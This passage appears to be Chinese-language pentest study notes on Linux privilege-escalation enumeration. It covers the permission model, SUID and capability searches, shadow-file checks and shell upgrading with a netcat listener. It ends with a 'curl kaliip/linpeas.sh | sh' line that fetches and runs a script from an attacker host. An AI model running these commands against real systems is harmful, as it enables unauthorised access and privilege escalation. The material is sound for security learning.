+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9573355.html" title="Linux ugo 权限 - sparkdev - 博客园">Linux ugo 权限 - sparkdev - 博客园</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/leehang/p/18995417" title="Linux 文件特殊权限位（SUID、SGID、Sticky Bit）的应用 - LeeHang - 博客园">Linux 文件特殊权限位（SUID、SGID、Sticky Bit）的应用 - LeeHang - 博客园</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/11417781.html" title="Linux Capabilities 简介 - sparkdev - 博客园">Linux Capabilities 简介 - sparkdev - 博客园</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/ytwoshuai/article/details/147517554" title="Linux安全模块：SELinux与AppArmor深度解析-CSDN博客">Linux安全模块：SELinux与AppArmor深度解析-CSDN博客</a></p>
+<h3 id="2-不常用安全机制"><a href="#2-不常用安全机制" class="headerlink" title="2. 不常用安全机制"></a>2. 不常用安全机制</h3><p>包括 <strong>Grsecurity</strong>、<strong>Pax</strong>、<strong>ExecShield</strong>、<strong>ASLR</strong>、<strong>TOMOYO Linux</strong>、<strong>SMACK</strong>、<strong>Yama</strong>、<strong>CGroups</strong>、<strong>Linux Namespaces</strong>、<strong>StackGuard</strong>、<strong>ProPolice</strong>、<strong>seccomp</strong>、<strong>ptrace</strong>、<strong>Capsicum</strong>、<strong>Mprotect</strong>、<strong>chroot</strong> 和 <strong>firejail</strong> 等。</p>
+<h2 id="三、提权原理"><a href="#三、提权原理" class="headerlink" title="三、提权原理"></a>三、提权原理</h2><h3 id="1-基于权限体系（安全机制）的利用"><a href="#1-基于权限体系（安全机制）的利用" class="headerlink" title="1. 基于权限体系（安全机制）的利用"></a>1. 基于权限体系（安全机制）的利用</h3><h3 id="2-基于用户行为的利用"><a href="#2-基于用户行为的利用" class="headerlink" title="2. 基于用户行为的利用"></a>2. 基于用户行为的利用</h3><h3 id="3-内存和-CPU-层面"><a href="#3-内存和-CPU-层面" class="headerlink" title="3.内存和 CPU 层面"></a>3.内存和 CPU 层面</h3><h2 id="四、提权枚举"><a href="#四、提权枚举" class="headerlink" title="四、提权枚举"></a>四、提权枚举</h2><p>提权枚举是提权过程中的关键步骤，不管是初始权限还是root权限 目的是收集系统和网络的信息，寻找可能的提权路径。<br>一般，把获得初始立足点（初始shell&#x2F;权限用户）之前叫<strong>侦查</strong>&#x2F;信息收集，目的是撕口子，获得初始立足点<br>获得初始立足点之后，为了提权，横向，渗透 打内网的信息收集叫<strong>枚举</strong>。枚举比侦察有常规方法，收集的信息内容&#x2F;使用的工具&#x2F;命令 更明确</p>
+<h3 id="1-升级命令行提示符-也叫终端升级（精）"><a href="#1-升级命令行提示符-也叫终端升级（精）" class="headerlink" title="1. 升级命令行提示符 &#x2F; 也叫终端升级（精）"></a>1. 升级命令行提示符 &#x2F; 也叫终端升级（精）</h3><p>在获得初始 Shell 后，通常需要升级到一个更完整、更稳定、交互性更强的命令行环境。 即：将我们的shell升级为完整的tty</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;  #最重要</span><br><span class="line">stty raw -echo</span><br><span class="line">export TERM=xterm-color     #TERM环境变量未设置                                #这三条命令可以提高shell交互性</span><br><span class="line"></span><br><span class="line">rlwrap nc -lvnp 443     #终端连接前加 rlwrap 这个工具可以便于上下翻找历史记录</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/307b29b37c7f77c6163f2ac634baa8f3.png" alt="image-20251213193106998"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="2-手工枚举（最重要，最前）"><a href="#2-手工枚举（最重要，最前）" class="headerlink" title="2. 手工枚举（最重要，最前）"></a>2. 手工枚举（最重要，最前）</h3><h4 id="2-1-枚举用户和系统信息"><a href="#2-1-枚举用户和系统信息" class="headerlink" title="2.1 枚举用户和系统信息"></a>2.1 枚举用户和系统信息</h4><h4 id="2-2-枚举文件和进程"><a href="#2-2-枚举文件和进程" class="headerlink" title="2.2 枚举文件和进程"></a>2.2 枚举文件和进程</h4><p><strong>awk 切，perl 胶，python 写马，gcc 编；nmap 扫，find 搜，nc 弹 Shell，wget 拉；tmux 保活，vi 改，内网再用 tftp 快。</strong></p>
+<h4 id="2-3-枚举网络和挂载"><a href="#2-3-枚举网络和挂载" class="headerlink" title="2.3 枚举网络和挂载"></a>2.3 枚举网络和挂载</h4><p>知道进程后的使用</p>
+<h4 id="2-4-枚举当前用户权限"><a href="#2-4-枚举当前用户权限" class="headerlink" title="2.4 枚举当前用户权限"></a>2.4 枚举当前用户权限</h4><blockquote>
+<p>比如这里列出了mysql是可以无需密码的利用root权限执行的</p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/9cface9d056bd0b1b35c60537fb0fc27.png" alt="image-20251124212531732"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="3-自动化枚举工具"><a href="#3-自动化枚举工具" class="headerlink" title="3. 自动化枚举工具"></a>3. 自动化枚举工具</h3><p>优点：简单，速度快，信息全 不足：需要搬运文件，会产生流量或流量特征；结果很长冗余；难以针对化（如果对各段了解不深入）<br>自动化工具可以快速扫描系统，发现潜在的提权漏洞。</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p>要看目标机器上豆安装了什么应用；系统版本…可能设有关键词屏蔽，一个不行另一个</p>
+</blockquote>
+<p>没有curl也可以在内存中执行</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><ul>
+<li><p><strong>UGO 体系</strong>：UGO 是 Linux 文件权限管理的基础，代表三种身份（U：文件所有者，G：文件的属组，O：其他人）和三种权限（r：读 4，w：写 2，x：执行 1）。</p>
+</li>
+<li><p><strong>SUID&#x2F;SGID</strong>：SUID 让普通用户临时拥有文件属主的执行权限，SGID 让目录下新建文件的属组继承该目录的属组。</p>
+</li>
+<li><p><strong>Capabilities</strong>：Capabilities 机制将 root 的特权细分为多个单元，允许进程以特定的能力运行，而非给予全部 root 权限。</p>
+</li>
+<li><p><strong>AppArmor 和 SELinux</strong>：基于强制访问控制（MAC）策略，AppArmor 使用应用程序配置文件，SELinux 基于安全策略进行访问控制。</p>
+</li>
+<li><p><strong>ACL（访问控制列表）</strong>：ACL 是 UGO 权限管理的补充，可针对特定用户或组设置文件或目录的访问权限。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiao_yi_xiao/article/details/117735278" title="Linux ACL访问控制权限完全攻略（超详细）_acl权限-CSDN博客">Linux ACL访问控制权限完全攻略（超详细）_acl权限-CSDN博客</a></p>
+</li>
+<li><p><strong>低权限修改可执行文件或脚本</strong>：如果低权限用户可以修改以高权限运行的可执行文件或脚本，就可以通过植入恶意代码获取高权限。UGO-RWX+S</p>
+</li>
+<li><p><strong>利用 SUID&#x2F;SGID</strong>：查找具有 SUID&#x2F;SGID 权限的二进制文件，若存在漏洞或配置错误，可用于提权。</p>
+</li>
+<li><p><strong>利用 Capabilities</strong>：检查进程是否具有特定的能力，如 <code>CAP_SYS_ADMIN</code>、<code>CAP_DAC_OVERRIDE</code> 等，利用这些能力进行提权。</p>
+</li>
+<li><p><strong>运维人员凭据泄露</strong>：低权限用户可能在使用高权限账户时，因备份或记录需要，将凭据保存在可访问的位置。如vim日志文件，断电之后的交换文件里面会有敏感信息</p>
+</li>
+<li><p><strong>内存和 CPU 层面的凭据捕捉</strong>：在权限体系的上层，攻击者可能在内存和 CPU 层面拦截，捕捉，或是修改凭据信息。如：基于内存去读取一些敏感信息来实现内核利用</p>
+</li>
+<li><p><strong>用户信息</strong>：<br><img src="https://i-blog.csdnimg.cn/img_convert/2cf0a8653c91e9114ccfd63bc978a967.png" alt="image-20251124204549218"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/fb7c14acd5b942e43b054a99d650181d.png" alt="image-20251124204603416"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p><strong><code>lxd</code></strong>：这是<strong>最关键的组</strong>，因为 LXD 是 Linux 容器管理工具，<strong>属于 <code>lxd</code> 组的用户可以创建和管理容器</strong>，并且<strong>默认可以挂载宿主机的文件系统</strong>，从而可能实现 <strong>容器逃逸 + 权限提升</strong>。</p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/a6c22ee48127e37d9e79e2566887b9c0.png" alt="image-20251124204758722"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/a9aea695a8d142e3523cb7e13b082228.png" alt="image-20251124205033428"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/61f89d5290c688230b5f93f1ca38aac9.png" alt="image-20251124205111416"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<ul>
+<li><code>whoami</code>：当前用户。</li>
+<li><code>id</code>：当前用户 UID、GID 和所属组。</li>
+<li><code>who</code>：当前登录的用户和相关信息（Linux是一个多用户系统，可以看除了当前用户还有哪些用户登陆了当前系统）可以显示登陆时间，终端类型</li>
+<li><code>w</code>：当前登录用户的详细信息，包括他们在做什么，及系统的负载信息；从哪个IP访问的，登陆时间，闲置时间，CPU的状态。</li>
+<li><code>last</code>：系统最近的登录记录。（有暴露内核版本）</li>
+</ul>
+</li>
+<li><p><strong>系统和内核信息</strong>：<br><img src="https://i-blog.csdnimg.cn/img_convert/13d92df3f5c136861f9f44bd40f68df1.png" alt="image-20251124205406761"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/0255a51570bea4e54176463677ffdfa5.png" alt="image-20251124210107540"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/03aa54bd75e4afaba5a562f0a194a39c.png" alt="image-20251125144107865"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/3b7cc25981b6650fc074a88a8c8a0674.png" alt="image-20251124210214865"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/2034e0dbaf052ee4b69f69a7ada59687.png" alt="image-20251124210254448"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/d11c723cc65583db47ab7187632ecd35.png" alt="image-20251124211902915"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<ul>
+<li><code>uname -a</code>：内核版本。</li>
+<li><code>lsb_release -a</code>（需下载）：发行版信息。<code>cat /etc/os-release</code></li>
+<li><code>cat /proc/version</code>：查看进程信息，获取内核和系统版本。</li>
+<li><code>cat /etc/issue</code>：系统版本。</li>
+<li><code>hostname/hostnamectl</code>：主机名和系统信息。<br>1.标识他，这台机器叫什么名字 2.提供这台机器在网络中的角色(SQL的服务器：可能叫:sql account&#x2F;bill&#x2F;order)<br>便于在信息枚举&#x2F;收集过程中定位他的角色，排出数据的优先级和重要性</li>
+</ul>
+</li>
+<li><p><strong>网络信息</strong>：<br><img src="https://i-blog.csdnimg.cn/img_convert/4752c543268105da83b11ddaff3bd78d.png" alt="image-20251124210435026"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/146e445265b71e1f915badf9ca916bd6.png" alt="image-20251124210608534"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/0b8875a662aa7e1ad431185efffe6198.png" alt="image-20251124210703713"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p><strong>OU 就是 MAC 地址里的“厂商身份证”，<code>00:50:56:\*</code> 一出现，说明这台机器是 VMware 虚拟化出来的。</strong></p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>192.168.168.2</code>&#x2F;<code>192.168.168.254</code></td>
+<td>邻居的 IP 地址</td>
+</tr>
+<tr>
+<td><code>dev ens33</code></td>
+<td>本机通过哪块网卡学到</td>
+</tr>
+<tr>
+<td><code>lladdr 00:50:56:...</code></td>
+<td>对方的<strong>MAC 地址</strong></td>
+</tr>
+<tr>
+<td><code>REACHABLE</code></td>
+<td>近期验证过，<strong>可直接通信</strong></td>
+</tr>
+<tr>
+<td><code>STALE</code></td>
+<td>超过验证时间，<strong>下次发送前会先 ARP 确认</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<ul>
+<li><code>ip addr</code> 或 <code>ifconfig</code>：IP 地址和网卡信息。 <code>ifconfig</code>是旧版过时的命令，如果机器比较老，可能只支持这个<blockquote>
+<p>网卡信息：拿到一个shell之后，如果有多张网卡，配合着路由信息去看，可以发现内网更多信息 <strong>IPv6</strong></p>
+</blockquote>
+</li>
+<li><code>ip route</code>：查看路由表信息。</li>
+<li><code>ip neigh</code>（查看网络邻居，内网比较有价值。） 或 <code>arp -a</code>（arp缓存，内网横向渗透常见）：可以看到局域网 IP 和 MAC 地址绑定关系。</li>
+</ul>
+</li>
+<li><p><strong>文件和目录</strong>：<br><img src="https://i-blog.csdnimg.cn/img_convert/471c04aded4bd6d7545509b2f16cca3d.png" alt="image-20251124213426391"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td>长格式（权限、硬链接数、属主、属组、大小、时间、名字）</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>显示<strong>inode 号</strong>（文件系统里唯一标识）</td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td>显示<strong>所有</strong>文件，包括以<code>.</code>开头的隐藏文件</td>
+</tr>
+<tr>
+<td><code>-h</code></td>
+<td>人类可读大小（K、M、G）</td>
+</tr>
+</tbody></table>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/5cf9059bf1be768ec93ebe45df2734fd.png" alt="image-20251124214100796"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<table>
+<thead>
+<tr>
+<th>字段序号</th>
+<th>名称</th>
+<th>含义说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>用户名</td>
+<td>登录系统时使用的名称，如<code>root</code>、<code>jack</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>密码占位符</td>
+<td>早期存加密密码，现在统一为<code>x</code>，<strong>真实密码在<code>/etc/shadow</code></strong></td>
+</tr>
+<tr>
+<td>3</td>
+<td>UID</td>
+<td>用户 ID，<code>0</code>表示 root，普通用户从<code>1000</code>开始</td>
+</tr>
+<tr>
+<td>4</td>
+<td>GID</td>
+<td>主组 ID，对应<code>/etc/group</code>中的组</td>
+</tr>
+<tr>
+<td>5</td>
+<td>描述信息（GECOS）</td>
+<td>可选，通常为用户全名、联系方式等，可用<code>chfn</code>修改</td>
+</tr>
+<tr>
+<td>6</td>
+<td>家目录</td>
+<td>用户登录后的默认工作目录，如<code>/home/jack</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>登录 Shell</td>
+<td>用户登录后默认启动的 shell，如<code>/bin/bash</code>，若为<code>/usr/sbin/nologin</code>则无法登录</td>
+</tr>
+</tbody></table>
+<p>有<strong>家目录</strong>，很可能是活跃用户，价值↑ 最后一个是否有**&#x2F;bin&#x2F;bash**，有了价值↑<br><img src="https://i-blog.csdnimg.cn/img_convert/05279ba35a26e7dfbf0e2fe27a46b6c0.png" alt="image-20251126192544697"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/c915e9f6007a61a5a4f324e9dfc5e6bd.png" alt="image-20251124214606446"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br>看自动任务的格式和权限，考虑能不能写反弹shell的提权<br><img src="https://i-blog.csdnimg.cn/img_convert/ca4677beca18f60150de6e8d1fbc7bd5.png" alt="image-20251124214956647"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>find</code></td>
+<td>查找文件</td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td>从根目录开始递归搜整个文件系统</td>
+</tr>
+<tr>
+<td><code>-perm -u=s</code></td>
+<td>匹配<strong>用户位</strong>设置了<strong>SUID</strong>的文件（<code>-</code>表示“至少”该位）</td>
+</tr>
+<tr>
+<td><code>-type f</code></td>
+<td>只列出普通文件，排除目录、链接等</td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code></td>
+<td>把“权限拒绝”等错误信息扔进黑洞，屏幕只保留结果</td>
+</tr>
+<tr>
+<td><code>perm</code></td>
+<td>就是<strong>permission</strong>的缩写，告诉<code>find</code>“按权限位过滤文件”。</td>
+</tr>
+</tbody></table>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/b34a7f70a558266e2d0b37721b3cbbaa.png" alt="image-20251125194041330"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/1a92b6621422f683b1e596b0b5f1a32f.png" alt="image-20251124213829673"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/71dd356d6b9afaa2ac58181130959f84.png" alt="image-20251125194304760"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>一句话作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>awk</strong></td>
+<td>按列&#x2F;模式切文本，**“行列都能算”**的轻量数据库。</td>
+</tr>
+<tr>
+<td><strong>perl</strong></td>
+<td><strong>超级脚本胶水</strong>，正则、网络、二进制一把梭，老派黑客最爱。</td>
+</tr>
+<tr>
+<td><strong>python</strong></td>
+<td>现世代渗透第一语言，库多、跨平台、写马快。</td>
+</tr>
+<tr>
+<td><strong>ruby</strong></td>
+<td>Metasploit 母语，写 exploit 脚本短平快。</td>
+</tr>
+<tr>
+<td><strong>gcc</strong></td>
+<td>把 C&#x2F;C++ 源码变可执行文件，<strong>内核 exploit 必备</strong>。</td>
+</tr>
+<tr>
+<td><strong>vi&#x2F;vim</strong></td>
+<td>服务器必存编辑器，<strong>“没图形也能改代码”</strong>。</td>
+</tr>
+<tr>
+<td><strong>nmap</strong></td>
+<td><strong>端口扫描代名词</strong>，扫段、OS 探、NSE 脚本一条龙。</td>
+</tr>
+<tr>
+<td><strong>find</strong></td>
+<td>**“按名、按权、按时间”**批量找文件，提权枚举神器。</td>
+</tr>
+<tr>
+<td><strong>netcat &#x2F; nc</strong></td>
+<td><strong>“网络瑞士军刀”</strong>，正&#x2F;反向 Shell、传文件、端口监听全靠它。</td>
+</tr>
+<tr>
+<td><strong>wget</strong></td>
+<td>命令行下载器，**“一句话拉马”**标配。</td>
+</tr>
+<tr>
+<td><strong>tftp</strong></td>
+<td>轻量 UDP 文件传输，<strong>内网无认证秒传马</strong>。</td>
+</tr>
+<tr>
+<td><strong>ftp</strong></td>
+<td>经典交互文件协议，<strong>旧机维持通道</strong>常用。</td>
+</tr>
+<tr>
+<td><strong>tmux &#x2F; screen</strong></td>
+<td>**“断网不断 Shell”**的多路复用，反弹 Shell 长驻后台。</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>ls -a</code> 或 <code>ls -liah</code>：查看<strong>隐藏文件</strong>和详细信息。</li>
+<li><code>cat /etc/passwd</code>：系统用户信息。</li>
+<li><code>ls -liah /etc/shadow</code>看shadow文件是否全局可读，如果可读，可以尝试hash碰撞</li>
+<li><code>cat /etc/crontab</code>：系统定时&#x2F;自动任务。</li>
+<li><code>echo $PATH</code> 和 <code>env</code>：环境变量路径的查看，看看有没有特殊的路径。做基于路径的提权利用的时候，可以追加或在前面附上想让他优先读取的路径</li>
+<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code>：查找 SUID 文件。查看有S位的可执行文件</li>
+<li><code>history</code>：列出历史操作记录（尤其是对于密码枚举操作的命令一定要查看，很可能会提示你，比如是否有特权 ）</li>
+<li><code>which</code>：查询可执行文件，不管是系统自带还是下载的（看看机器装没装一些可能有用的程序，只显示第一次的查找结果，比如awk许多目录都有安装）</li>
+</ul>
+</li>
+<li><p><strong>进程信息</strong>：<br><img src="https://i-blog.csdnimg.cn/img_convert/e16332c108997d6dbc129de9b7de2b3e.png" alt="image-20251124215039681"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/558070d551e92f277b31a2df90aa75de.png" alt="image-20251124215241352"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<table>
+<thead>
+<tr>
+<th>字段名</th>
+<th>含义说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PPID</strong></td>
+<td>Parent Process ID，<strong>父进程 ID</strong></td>
+</tr>
+<tr>
+<td><strong>PID</strong></td>
+<td>Process ID，<strong>当前进程 ID</strong></td>
+</tr>
+<tr>
+<td><strong>PGID</strong></td>
+<td>Process Group ID，<strong>进程组 ID</strong>（用于信号批量发送）</td>
+</tr>
+<tr>
+<td><strong>SID</strong></td>
+<td>Session ID，<strong>会话 ID</strong>（通常等于会话首领的 PID）</td>
+</tr>
+<tr>
+<td><strong>TTY</strong></td>
+<td>控制终端，**?**表示没有终端（后台进程）</td>
+</tr>
+<tr>
+<td><strong>TPGID</strong></td>
+<td>终端前台进程组 ID，<strong>-1</strong>表示没有终端</td>
+</tr>
+<tr>
+<td><strong>STAT</strong></td>
+<td>进程状态，如<code>S</code>（睡眠）、<code>R</code>（运行）、<code>Z</code>（僵尸）等</td>
+</tr>
+<tr>
+<td><strong>UID</strong></td>
+<td>运行该进程的用户 ID</td>
+</tr>
+<tr>
+<td><strong>TIME</strong></td>
+<td>累计占用的 CPU 时间</td>
+</tr>
+<tr>
+<td><strong>COMMAND</strong></td>
+<td>启动命令（包含参数，树形缩进显示父子关系）</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>ps -ef/-A</code> （e是全部 f是列表格式）或 <code>ps aux</code>：查看全部进程。（u是启动进程的用户，x是没有连接到终端的进程）</li>
+<li><code>ps axjf</code>：进程树。（x是没有连接到终端的进程）</li>
+<li><code>top -n 1</code>：实时进程信息。</li>
+</ul>
+</li>
+<li><p><strong>网络连接</strong>：<br><img src="https://i-blog.csdnimg.cn/img_convert/0a3769cb9e4bbe3815890952e2f81a67.png" alt="image-20251125193909901"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/de3603b3d9c0da81548872295c5d1f75.png" alt="image-20251124215958644"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/3d10d547b687e031bae6a1c1af701e3d.png" alt="image-20251124220043378"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><code>netstat -l</code>：正在监听的端口<br><img src="https://i-blog.csdnimg.cn/img_convert/cd83f4cfafd4ef2db0abe0ed3be58643.png" alt="image-20251124220117965"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<ul>
+<li><code>netstat -a</code> （-at是TCP -au是UDP）或 <code>netstat -ano</code>（all 不解析名称 计时器timer）：显示所有网络连接和端口。</li>
+</ul>
+</li>
+<li><p><strong>挂载信息</strong>：</p>
+<ul>
+<li><code>cat /etc/fstab</code>：检测未挂载的硬盘和配置。（运维人员做快照&#x2F;备份时，会用另一块磁盘临时挂载上，运行后就“未挂载状态”。里面可能存在运维人员使用的备份，或敏感信息）</li>
+</ul>
+</li>
+<li><p><code>sudo -l</code>查看当前用户有哪些以root身份执行的 <strong>（非常重要）</strong></p>
+</li>
+<li><p><strong>capabilities</strong><br><img src="https://i-blog.csdnimg.cn/img_convert/57babe266dcaafcfd655310198ce25fd.png" alt="image-20251124213251483"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<ul>
+<li><code>getcap -r / 2&gt;/dev/null</code> 查看“得到权限能力”根目录下的所有文件</li>
+</ul>
+</li>
+<li><p><strong>PEASS-ng（linpeas.sh）</strong>：（最新，最常用，支持MAC OS &#x2F;Linux &#x2F;Windows） 一般四五分钟，十分钟之内<br><img src="https://i-blog.csdnimg.cn/img_convert/d479f508776d7bf4f54a147ac80e644e.png" alt="image-20251125195605364"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><img src="https://i-blog.csdnimg.cn/img_convert/bc95946db5e163f6b8e5f3aede74d5ca.png" alt="image-20251125201334255"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br>靶机中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl kaliip/linpeas.sh | sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/a1c32d85a711587ad4be4291eebf3eff.png" alt="image-20251125201442699"></p>
